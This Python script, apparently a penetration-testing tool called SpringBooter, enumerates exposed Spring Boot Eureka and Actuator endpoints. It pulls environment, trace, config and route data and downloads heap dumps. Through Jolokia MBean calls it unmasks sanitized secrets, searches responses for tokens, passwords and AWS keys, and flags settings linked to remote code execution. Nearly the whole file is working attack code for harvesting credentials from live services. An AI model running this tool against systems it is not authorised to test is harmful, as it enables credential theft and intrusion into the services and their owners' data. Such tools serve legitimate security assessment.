import requests
import simplejson
import logging, sys
from urllib.parse import urlparse
import re
import os
import time
import json
import argparse

graphix = """
  ██████  █    ██  ██▓███  ▓█████  ██▀███   ██░ ██  ▄▄▄       ▄████▄  
▒██    ▒  ██  ▓██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒▓██░ ██▒▒████▄    ▒██▀ ▀█  
░ ▓██▄   ▓██  ▒██░▓██░ ██▓▒▒███   ▓██ ░▄█ ▒▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ 
  ▒   ██▒▓▓█  ░██░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒
▒██████▒▒▒▒█████▓ ▒██▒ ░  ░░▒████▒░██▓ ▒██▒░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░
▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░
░ ░▒  ░ ░░░▒░ ░ ░ ░▒ ░      ░ ░  ░  ░▒ ░ ▒░ ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   
░  ░  ░   ░░░ ░ ░ ░░          ░     ░░   ░  ░  ░░ ░  ░   ▒   ░        
      ░     ░                 ░  ░   ░      ░  ░  ░      ░  ░░ ░      
                                                             ░                                                
"""

class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
	PURPLE = '\033[95m'
	BLINK = '\033[5m'

DEBUG = False
URLS =[]

# JSON result rendering
endpoints = {}
endpoints['endpoints'] = {}

# Each time executed a new session folder is created. All file saves will be here
SESSION_DIR = "./sb_"+ str(time.time())
ENDPOINT_JSON_DIR = "/endpoint-json" 

# filter list of property keys you don't want to see unsanitized. like "sun.java.command"
filter_sanitized_keys=[]

# stores each endpoint touched respectively
URL_EUREKA_HISTORY = []
URL_SBA_HISTORY = []

# keywords used to search keys in JSON responses
GENERIC_KEYS_SEARCH = ["user", "auth", "token", "bearer", "secret", "pass", "key", "session", "cookie", "aws", "s3", "bucket", "account" ]

# keys to look for in /env
ENV_SEARCH_KEYS = { "spring.cloud.bootstrap.location":
   "This node has property thats indicitive of the SnakeYAML RCE.  See https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators#spring.cloud.bootstrap.location, See https://tutorialboy24.medium.com/a-study-notes-of-exploit-spring-boot-actuator-8b5375c75d98",
                    "spring.datasource.tomcat.validationQuery": "Can execute SQL commands to the connected JDBC database: see https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators#spring.datasource.tomcat.validationquery"
   , "spring.datasource.tomcat.url": " see https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators#spring.datasource.tomcat.validationquery",
                    "spring.datasource.data":"RCE: https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators#spring.datasource.data",
                    "spring.datasource.url":"RCE: see https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators#spring.datasource.url"}

# keys to look for in /jolokia/list
JOLOKIA_LIST_MBEANS = {"ch.qos.logback.classic":"The ch.qos.logback.classic MBean is installed which means it is susceptible RCE. Reference: https://www.veracode.com/blog/research/exploiting-spring-boot-actuators / Needs a better walkthrough.",
                       "Tomcat":"One of the MBeans of Tomcat (embedded into Spring Boot) is createJNDIRealm. createJNDIRealm allows creating JNDIRealm that is vulnerable to JNDI injection. see https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators#tomcat-createjndirealm"}

# unsanitize beans
UNSANITIZE_BEANS = ("org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","org.springframework.boot:name=SpringApplication,type=Admin", )

## Not implementated yet
SAVE_JSON_OUT = False # add option to choose whether to save or json


def args_init():
  parser = argparse.ArgumentParser(
        usage="%(prog)s [OPTION] [FILE]...",
        description="An enumerator for Spring Boot Eureka and Actuator endpoints."
    )
  parser.add_argument(
      "-v", "--version", action="version",
      version = f"{parser.prog} version 1.0"
  )
  
  parser.add_argument('-f', '--filter', nargs="*", 
      help='Filter out certain properties from being unsanitized. A space seperated list. e.g. --filter user.security aws.key')
      
  parser.add_argument('-u', '--url',  
      help='A single base endpoint to be examined. ex. http://1.1.1.1:6767')
      
  parser.add_argument('-l', '--file',  
      help='A list of endpoints to be examined. One base url per line. e.g. http://1.1.1.1:6767')
  
  parser.add_argument('-n', '--noheap', action='store_true',  
      help='Skip downloading the heap file')
      
  return parser

def get_sba_ep_json(url):
  try:
      r = requests.get(url, timeout=2)
      if r.status_code == 200:
        try: 
          data = r.json()
          print(bcolors.OKGREEN+"    [+] Recieved JSON Response."+bcolors.ENDC)
          return data 
        except simplejson.errors.JSONDecodeError:
          if DEBUG:
            print(bcolors.FAIL+"    [-] Did not get a JSON response? "+bcolors.ENDC)
      else:
       try:
          data = r.json()
          if r.status_code and data['error'] and data['message']:
            print("    [-]"+bcolors.FAIL+" HTTP STATUS: "+str(r.status_code)+" error: "+data['error']+" msg: "+data['message']+bcolors.ENDC)
          else:
            print("    [-]"+bcolors.FAIL+" HTTP STATUS: "+str(r.status_code))
       except simplejson.errors.JSONDecodeError:
        if DEBUG:
            print(bcolors.FAIL+"    [-] Did not get a JSON response? "+bcolors.ENDC)
            print()
       except KeyError:
          print(bcolors.FAIL+"    [-] Did not get the JSON acces denied message. e.g standard error json blob.  "+bcolors.ENDC)
          print()
  except requests.exceptions.ConnectTimeout:
    print("    [-]"+bcolors.FAIL+' ERROR: Timeout has been raised on '+url+'.'+bcolors.ENDC)
  except requests.exceptions.ConnectionError:
    print("    [-]"+bcolors.FAIL+' ERROR: ConnectionError has been raised on '+url+'.'+bcolors.ENDC)
  except requests.exceptions.ReadTimeout:
     print("    [-]"+bcolors.FAIL+' ERROR: Read timed out. (read timeout=2) '+url+'.'+bcolors.ENDC)

def get_eureka_apps(url):
    url = urlparse(url).scheme + "://" + urlparse(url).netloc
    print("  [-] Attempting to retireve JSON response => "+url+"/eureka/apps"); 
    try:
      r = requests.get(url+"/eureka/apps",headers={"Accept":"application/json"}, timeout=2)
      if r.status_code == 200:
        data = r.json()
        print(bcolors.OKGREEN+"    [+] Recieved JSON data."+bcolors.ENDC);
        #save Eureka JSON to disk  
        saveFile = SESSION_DIR+ENDPOINT_JSON_DIR+"/"+urlparse(url).netloc.replace(":","-")+"-Eureka-apps.json"
        save_json(saveFile, data)
        print(bcolors.OKGREEN+"  [+] JSON output from /eureka/apps saved to: "+saveFile+bcolors.ENDC)        
        return data
      else:
        print(bcolors.FAIL+"    [-] Did not get a JSON response.  Not an Eureka endpoint?"+bcolors.ENDC)
    except Exception as e:
        print("  - Could not connect to: "+url)

def print_simple_sbep_list(sbEndpoints):
    print("    "+bcolors.UNDERLINE+bcolors.HEADER+"Instance details:"+bcolors.ENDC)
    for ep in sbEndpoints:
      if ep['status'] == "UP":
        print("      ("+bcolors.OKGREEN+ep['status']+bcolors.ENDC, end="")
      elif ep['status'] == "DOWN":
        print("      ("+bcolors.FAIL+ep['status']+bcolors.ENDC, end="")
      else:
        print("      ("+ep['status'], end="")
      print(f")\tApp: {ep['appname']:<40} SBA: {ep['sbactuatorendpoint']}")  
    print("")# adds newline

def eureka_process(url):
    data = get_eureka_apps(url)
    if data is not None:
      sbEndpoints = parse_eureka_apps_json(data, url)  
      if sbEndpoints is not None: #save Eureka JSON to disk        
        saveFile = SESSION_DIR+ENDPOINT_JSON_DIR+"/"+urlparse(url).netloc.replace(":","-")+"-Eureka-instances.json"
        save_json(saveFile, sbEndpoints)
        print(bcolors.OKGREEN+"  [+] JSON output from collected instances saved to: "+saveFile+bcolors.ENDC)
        return sbEndpoints
    else:
       # normally the eureka endpoint also has SBA endpoints.  So add it as an instance or ifs not it could be a SBA ep   
       print(bcolors.FAIL+"    [-] No Instances Found"+bcolors.ENDC)
       sbEndpoints = []
       add_eureka_as_sba_ep(url,sbEndpoints)
       print(bcolors.OKGREEN+"    [+] Adding itself as a Spring Boot Actuator ep."+bcolors.ENDC)
       return sbEndpoints

     
def add_eureka_as_sba_ep(eurekaUrl,sbEndpoints):
    if sbEndpoints is not None:
      instance={}
      instance['sbactuatorendpoint'] = eurekaUrl
      instance['appname'] = "Self - Eurkeka EP"
      instance['status'] = "NA" 
      sbEndpoints.append(instance)

def parse_eureka_apps_json(data, url):
    print("  [-] Parsing retrieved Eureka JSON response.")
    springBootEndPoints=[]
    try:
        #t = data['applications']
        for application in data['applications']['application']:
          for instance in application['instance']:
            instances={}
            instances['appname'] = application['name']
            instances['status'] = instance['status']
            instances['sbactuatorendpoint'] = instance['statusPageUrl'][:instance['statusPageUrl'].rfind('/')]

            try:
              instances['dcname'] = instance['dataCenterInfo']['name']
              instances['dcMetadata'] = instance['dataCenterInfo']['metadata']
            except KeyError:
              if DEBUG:
                print("DEBUG: No DC/DC Metadata found.")
            springBootEndPoints.append(instances)
    except KeyError:
      print(bcolors.FAIL+"    [-] Parsing error of Eureka json.  Not a Eureka json response?"+bcolors.ENDC)
  
    # normally the eureka endpoint also has SBA endpoints.  So add it as an instance    
    add_eureka_as_sba_ep(url,springBootEndPoints)  
    if len(springBootEndPoints) == 1:
      print(bcolors.OKGREEN+"    [+] No instances found.  Adding itself as an SBA endpoint."+bcolors.ENDC)
    else:   
      print(bcolors.OKGREEN+"    [+] "+str(len(springBootEndPoints))+" instances found."+bcolors.ENDC)  
    
    return springBootEndPoints
    
def unsanitize_req(url, key, payload):   
   try:
     r = requests.post(url+"/jolokia", headers={"Content-Type":"application/json"},data = payload, timeout=2)
     if r.status_code == 200:
       try:
         data = r.json()
         #print(data)
         return data['value']
       except simplejson.errors.JSONDecodeError:
         print("    - ERROR: No JSON for "+url+" HTTP STATUS: "+str(r.status_code))
       except KeyError:     
         return None
     else:
         if DEBUG:
            print(bcolors.FAIL+"    [-] Did not get a JSON response? "+bcolors.ENDC)     
   except requests.exceptions.ConnectTimeout:
     print('    - ERROR: Timeout has been raised on '+URL+'.')
   except requests.exceptions.ConnectionError:
     print('    - ERROR: ConnectionError has been raised on '+URL+'.')


def try_unsanitize(url, key):
  for bean in UNSANITIZE_BEANS:
      payload = '{"mbean": "'+bean+'","operation": "getProperty", "type": "EXEC", "arguments": ["'+key+'"]}'
      unsanitized_value = unsanitize_req(url, key, payload)
      if unsanitized_value is not None:
        return unsanitized_value
  return
  
def get_sba_sanitized_values(url,data):
    unsanitized_keys = {}
    
    print("    [-] Searching for sanitized keys & attempting to desanitize via some class getProperty operation")
    for key in data:
      if isinstance(data[key], dict):
        for key2 in data[key]:
          if key2 not in filter_sanitized_keys:
             if re.search("[*]+", str(data[key][key2])):
               print(bcolors.OKGREEN+"      [+] Found key ["+key+" -> "+key2+"]:"+bcolors.ENDC)
               unsanitized_value = try_unsanitize(url, key2)
               
               if unsanitized_value is not None:
                 print(bcolors.BOLD+"          Unsanitized value: "+unsanitized_value+bcolors.ENDC)
                 data[key][key2] = unsanitized_value # update key with unsantized value
                 unsanitized_keys[key+"->"+key2] = {"":unsanitized_value}
               else:
                 print(bcolors.FAIL+"      [-] Could not unsanitize key via jolokia "+bcolors.ENDC)
                 break
      else: # not a dic.  plain key/value
        if re.search("[*]+", str(data[key])):
          if key not in filter_sanitized_keys:
            print("Found key"+key)
            unsanitized_value = try_unsanitize(url, key) 
            print("        Unsanitized value: "+unsanitized_value)
            if unsanitized_value is not None:
              data[key] = unsanitized_value # update key with unsantized value
              unsanitized_keys[key]=unsanitized_value
              
    return unsanitized_keys
    
def match_key_in_json2(obj, key):
    if key in obj: return obj[key]
    for k, v in obj.items():
        if isinstance(v,dict):
            item = match_key_in_json2(v, key)
            if item is not None:
                return item

## processes /env
def process_sba_env_json_data(url):
    datapoints = {}
    exploits = {}
    print("  "+bcolors.UNDERLINE+bcolors.HEADER+"Fetching SBA @: "+url+ "/env"+bcolors.ENDC)
    data = get_sba_ep_json(url + "/env")
    if data is not None:
      unsanitized_keys = get_sba_sanitized_values(url,data)
      
      # find interesting keys
      print(bcolors.OKGREEN+"    [+] Searching for indicators of exploit"+bcolors.ENDC)
      for indicator in ENV_SEARCH_KEYS:
        matchValue = match_key_in_json2(data, indicator)
        if matchValue is not None:
          print(bcolors.BLINK+bcolors.WARNING+bcolors.BOLD+"      [+]"+ bcolors.ENDC,end="")
          print(bcolors.BOLD+" Found: "+indicator+" : "+matchValue+bcolors.ENDC)
          print(bcolors.BOLD+"          "+ENV_SEARCH_KEYS[indicator]+bcolors.ENDC)
          exploits[indicator] = {'valueRetrieved': indicator, 'info':ENV_SEARCH_KEYS[indicator]}
          
      #save JSON to disk          
      saveFile = SESSION_DIR+ENDPOINT_JSON_DIR+"/"+urlparse(url).netloc.replace(":","-")+"-env.json"
      save_json(saveFile,data)
      print(bcolors.OKGREEN+"    [+] JSON saved to(w/unsanitized): "+saveFile+bcolors.ENDC)
      print()
      
      # store collected datapoints
      datapoints['exploit'] = exploits
      datapoints['unsanitized_keys'] = unsanitized_keys
      datapoints['saveFilePath'] = saveFile
      add_datapoint(endpoints, url, "/env", datapoints)
      return data

def check_for_jolokia(url):
  datapoints = {}
  exploits = {}
  print("  "+bcolors.UNDERLINE+bcolors.HEADER+"Fetching SBA @: "+url+"/jolokia"+bcolors.ENDC)
  data = get_sba_ep_json(url+"/jolokia")
  if data is not None:
    print(bcolors.OKGREEN+"      [+] /jolokia found."+bcolors.ENDC)
    saveFile = SESSION_DIR+ENDPOINT_JSON_DIR+"/"+urlparse(url).netloc.replace(":","-")+"-jolokia.json"
    save_json(saveFile,data)
    exploits['Potencial'] = {'ch.qos.logback.classic': 'RCE', 'info':'Since the jolokia endpoint responed if the ch.ops.logback.classic MBean is installed you can get RCE.  look at /jolokia/list for confirmation of the MBean.  Reference: https://www.veracode.com/blog/research/exploiting-spring-boot-actuators / Needs a better walkthrough.'}
    print(bcolors.BLINK+bcolors.WARNING+bcolors.BOLD+"      [+]"+ bcolors.ENDC,end="")
    print(bcolors.BOLD+" "+exploits['Potencial']['info']+bcolors.ENDC)
    
    print(bcolors.OKGREEN+"    [+] JSON saved to: "+saveFile+bcolors.ENDC)
    datapoints['exploit'] = exploits
    datapoints['saveFilePath'] = saveFile
    add_datapoint(endpoints, url, "/jolokia", datapoints)

  datapoints = {}
  print("  "+bcolors.UNDERLINE+bcolors.HEADER+"Fetching SBA @: "+url+"/jolokia/list"+bcolors.ENDC)
  data = get_sba_ep_json(url+"/jolokia/list")
  if data is not None:
    print(bcolors.OKGREEN+"      [+] jolokia/list found."+bcolors.ENDC)
    
    for mbean in JOLOKIA_LIST_MBEANS:
      #print(mbean)
      matchValue = match_key_in_json2(data, mbean)
      if matchValue is not None:
          print(bcolors.BLINK+bcolors.WARNING+bcolors.BOLD+"      [+]"+ bcolors.ENDC,end="")
          print(bcolors.BOLD+" Found: "+mbean+" : "+JOLOKIA_LIST_MBEANS[mbean]+bcolors.ENDC)
          #print(bcolors.BOLD+"          "+ENV_SEARCH_KEYS[indicator]+bcolors.ENDC)
          exploits[mbean] = JOLOKIA_LIST_MBEANS[mbean]
      
    saveFile = SESSION_DIR+ENDPOINT_JSON_DIR+"/"+urlparse(url).netloc.replace(":","-")+"-jolokia-list.json"
    save_json(saveFile,data)
    print(bcolors.OKGREEN+"    [+] JSON saved to: "+saveFile+bcolors.ENDC)
    print()
    datapoints['exploit'] = exploits
    datapoints['saveFilePath'] = saveFile
    add_datapoint(endpoints, url, "/jolokia/list", datapoints)

def check_for_info(url):
  baseUrl=url
  datapoints = {}
  url += "/info"
  print("  "+bcolors.UNDERLINE+bcolors.HEADER+"Fetching SBA @: "+url+bcolors.ENDC)
  data = get_sba_ep_json(url)
  if data is not None:
    print(bcolors.OKGREEN+"      [+] /info found."+bcolors.ENDC)
    saveFile = SESSION_DIR+ENDPOINT_JSON_DIR+"/"+urlparse(url).netloc.replace(":","-")+"-info.json"
    save_json(saveFile,data)
    print(bcolors.OKGREEN+"    [+] JSON saved to: "+saveFile+bcolors.ENDC)
    print()
    datapoints['saveFilePath'] = saveFile
    add_datapoint(endpoints, baseUrl, "/info", datapoints)
    
def check_for_beans(url):
  baseUrl=url
  datapoints = {}
  url += "/beans"
  print("  "+bcolors.UNDERLINE+bcolors.HEADER+"Fetching SBA @: "+url+bcolors.ENDC)
  data = get_sba_ep_json(url)
  if data is not None:
    print(bcolors.OKGREEN+"      [+] /beans found."+bcolors.ENDC)
    saveFile = SESSION_DIR+ENDPOINT_JSON_DIR+"/"+urlparse(url).netloc.replace(":","-")+"-beans.json"
    save_json(saveFile,data)
    print(bcolors.OKGREEN+"    [+] JSON saved to: "+saveFile+bcolors.ENDC)
    print()
    datapoints['saveFilePath'] = saveFile
    add_datapoint(endpoints, baseUrl, "/beans", datapoints)

def check_for_mappings(url):
  baseUrl=url
  datapoints = {}
  url += "/mappings"
  print("  "+bcolors.UNDERLINE+bcolors.HEADER+"Fetching SBA @: "+url+bcolors.ENDC)
  data = get_sba_ep_json(url)
  if data is not None:
    print(bcolors.OKGREEN+"      [+] /mappings found."+bcolors.ENDC)
    saveFile = SESSION_DIR+ENDPOINT_JSON_DIR+"/"+urlparse(url).netloc.replace(":","-")+"-mappings.json"
    save_json(saveFile,data)
    print(bcolors.OKGREEN+"    [+] JSON saved to: "+saveFile+bcolors.ENDC)
    print()
    datapoints['saveFilePath'] = saveFile
    add_datapoint(endpoints, baseUrl, "/mappings", datapoints)

def check_for_configprops(url):
  baseUrl=url
  datapoints = {}
  url += "/configprops"
  print("  "+bcolors.UNDERLINE+bcolors.HEADER+"Fetching SBA @: "+url+bcolors.ENDC)
  data = get_sba_ep_json(url)
  if data is not None:
    print(bcolors.OKGREEN+"      [+] /configprops found."+bcolors.ENDC)
     # search for keys of value
    print(bcolors.OKGREEN+"      [+] Searching for interesting fields in /configprops ."+bcolors.ENDC)
    matches = {}
    for key, value in recursive_items(data):
      for searchword in GENERIC_KEYS_SEARCH:
        if re.search(searchword, key, re.IGNORECASE):
          if key not in matches:
            matches[key] = value
    print(bcolors.OKGREEN+"        [+] fields Found (only displays first found instance):  "+bcolors.ENDC)
    for key in matches:
       print(bcolors.BOLD, end="")
       print(f"        {key:<25} {matches[key]}"+bcolors.ENDC)
    datapoints['interestingFields'] = matches   
    saveFile = SESSION_DIR+ENDPOINT_JSON_DIR+"/"+urlparse(url).netloc.replace(":","-")+"-configprops.json"
    save_json(saveFile,data)
    print(bcolors.OKGREEN+"    [+] JSON saved to: "+saveFile+bcolors.ENDC)
    print()
    datapoints['saveFilePath'] = saveFile
    add_datapoint(endpoints, baseUrl, "/configprops", datapoints)

def check_for_trace(url):
  baseUrl=url
  datapoints = {}
  url += "/trace"
  print("  "+bcolors.UNDERLINE+bcolors.HEADER+"Fetching SBA @: "+url+bcolors.ENDC)
  data = get_sba_ep_json(url)
  if data is not None:
    print(bcolors.OKGREEN+"      [+] /trace found."+bcolors.ENDC)
    saveFile = SESSION_DIR+ENDPOINT_JSON_DIR+"/"+urlparse(url).netloc.replace(":","-")+"-trace.json"
    save_json(saveFile, data)
    
    # search for keys of value
    print(bcolors.OKGREEN+"      [+] Searching for interesting fields in /trace ."+bcolors.ENDC)
    matches = {}
    if isinstance(data, list): # do this for the trace json blob that isn't an array of dicts. most likely its bogus data if its not a list.
        for item in data:
          for key, value in recursive_items(item):
            for searchword in GENERIC_KEYS_SEARCH:
              if re.search(searchword, key, re.IGNORECASE):
                if key not in matches:
                  matches[key] = value
    print(bcolors.OKGREEN+"        [+] fields Found (only displays first found instance):  "+bcolors.ENDC)
    for key in matches:
       print(bcolors.BOLD, end="")
       print(f"        {key:<25} {matches[key]}"+bcolors.ENDC)
    datapoints['interestingFields'] = matches   
    
   
    print(bcolors.OKGREEN+"  [+] JSON output from collected instances saved to: "+saveFile+bcolors.ENDC)
    print()
    datapoints['saveFilePath'] = saveFile
    add_datapoint(endpoints, baseUrl, "/trace", datapoints)   

def check_for_gateway_routes(url):
  baseUrl=url
  datapoints = {}
  url += "/gateway/routes"
  print("  "+bcolors.UNDERLINE+bcolors.HEADER+"Fetching SBA @: "+url+bcolors.ENDC)
  data = get_sba_ep_json(url)
  if data is not None:
    print(bcolors.OKGREEN+"      [+] /gateway/routes found."+bcolors.ENDC)
    saveFile = SESSION_DIR+ENDPOINT_JSON_DIR+"/"+urlparse(url).netloc.replace(":","-")+"-gateway-routes.json"
    save_json(saveFile,data)
    print(bcolors.OKGREEN+"    [+] JSON saved to: "+saveFile+bcolors.ENDC)
    print()
    datapoints['saveFilePath'] = saveFile
    add_datapoint(endpoints, baseUrl, "/gateway-routes", datapoints)

def check_for_heapdump(url):
  if args.noheap is True:  # skip headdump
    return
  baseUrl=url
  url += "/heapdump"
  datapoints = {}
  print("  "+bcolors.UNDERLINE+bcolors.HEADER+"Fetching SBA @: "+url+bcolors.ENDC)
  try:
      response = requests.get(url)
      if response.status_code == 200 and response.headers.get('Content-Type') == "application/octet-stream":
        print(bcolors.OKGREEN+"      [+] /heapdump found."+bcolors.ENDC)
        saveFile = SESSION_DIR+ENDPOINT_JSON_DIR+"/"+urlparse(url).netloc.replace(":","-")+"-heapdump.gz"
        with open(saveFile, "wb") as f:
          f.write(response.content)
        print(bcolors.OKGREEN+"      [+] heapdump saved to: "+saveFile+bcolors.ENDC)
        print()
        datapoints['saveFilePath'] = saveFile
        add_datapoint(endpoints, baseUrl, "/heapdump", datapoints)
      else:
        print(bcolors.FAIL+"      [+] /heapdump not found."+bcolors.ENDC)   
  except Exception as e:
     print(bcolors.FAIL+"      [-] Could not get heapdump. exception occured. "+bcolors.ENDC)
    
def save_json(filename, data):
    out = json.dumps(data, indent=4)
    with open(filename, "w") as outfile:
       outfile.write(out)
  
def banner():
    print (bcolors.OKBLUE+graphix+bcolors.ENDC)
    print (bcolors.OKBLUE+"\t\t  SpringBooter 1.0 / 2022 SuperHac\n"+bcolors.ENDC, end="")
    print (bcolors.OKBLUE+"\tAn enumerator for Spring Boot Eureka and Actuator endpoints\n"+bcolors.ENDC)

def load_file_of_endpoints(filename):
  lines=[]
  try:
    with open(filename) as file:
      for line in file:
        line = line.rstrip()
        if line != "" and line[0] !="#": # you can have comments in file
          if line.endswith('/'):
            line = line[:-1]
          lines.append(line)
  except FileNotFoundError:
    print(bcolors.FAIL+"Your endpoint file not found, Exiting!"+bcolors.ENDC)
    exit()
  return lines

def check_dup_urls(url, history):
  if url in history:
    return True
  else:
    return False

def recursive_items(dictionary):
    for key, value in dictionary.items():
        if type(value) is dict:
            yield from recursive_items(value)
        else:
            yield (key, value)

def add_datapoint(rootNode,baseUrl,ep, data):  
  try:
    rootNode['endpoints'][baseUrl][ep]=data
  except KeyError: # first instance of baseNode
    rootNode['endpoints'][baseUrl] = {ep:data}
 
### MAIN 
banner()

setargs = args_init()
args = setargs.parse_args()

# the desaniztize key list
if args.filter is not None:
  filter_sanitized_keys = args.filter
  
# setup and check args
if args.url is not None:
  if args.url.endswith('/'):
        args.url = args.url[:-1]
  URLS.append(args.url)
elif args.file is not None:
  URLS = load_file_of_endpoints(args.file)
else:
   print(bcolors.FAIL+"No URL or file specified.  -u or -l"+bcolors.ENDC)

# make a session dir
os.mkdir(SESSION_DIR)
os.mkdir(SESSION_DIR+ENDPOINT_JSON_DIR)

# get the eireka/apps endpoint for instances
for url in URLS:
  print(bcolors.HEADER+"Attempting to connect via Eureka => "+bcolors.ENDC+url)
  if not check_dup_urls(url, URL_EUREKA_HISTORY):
    sbEndpoints = eureka_process(url)
    if sbEndpoints is not None:
      print_simple_sbep_list(sbEndpoints)
      print(bcolors.BOLD+"Enumerating Spring Boot Actuator (SBA) Instances\n"+bcolors.ENDC)
      URL_EUREKA_HISTORY.append(url)
      for ep in sbEndpoints:
        if not check_dup_urls(url, URL_SBA_HISTORY):
          process_sba_env_json_data(ep['sbactuatorendpoint'])
          check_for_jolokia(ep['sbactuatorendpoint'])
          check_for_trace(ep['sbactuatorendpoint'])     
          check_for_info(ep['sbactuatorendpoint'])
          check_for_beans(ep['sbactuatorendpoint'])
          check_for_mappings(ep['sbactuatorendpoint'])
          check_for_configprops(ep['sbactuatorendpoint'])
          check_for_gateway_routes(ep['sbactuatorendpoint'])
          check_for_heapdump(ep['sbactuatorendpoint'])
          
          URL_SBA_HISTORY.append(ep['sbactuatorendpoint'])
          print()
        else:
          print(bcolors.WARNING+"  * Already scanned SBA enpoint. Skipping. => "+bcolors.ENDC+url)
          print() 
    else:
        print(bcolors.HEADER+"no sba endpoints? "+bcolors.ENDC)
  else:
    print(bcolors.WARNING+"    [-] Already scanned Eureka enpoint. Skipping."+bcolors.ENDC)
    print()

print("Total Eureka Endpoints checked: "+ str(len(URL_EUREKA_HISTORY)))
print("Total SBA Endpoints checked: "+ str(len(URL_SBA_HISTORY)))

# save endpoint datapoints
save_json(SESSION_DIR+"/alive-enpoints.json", endpoints)



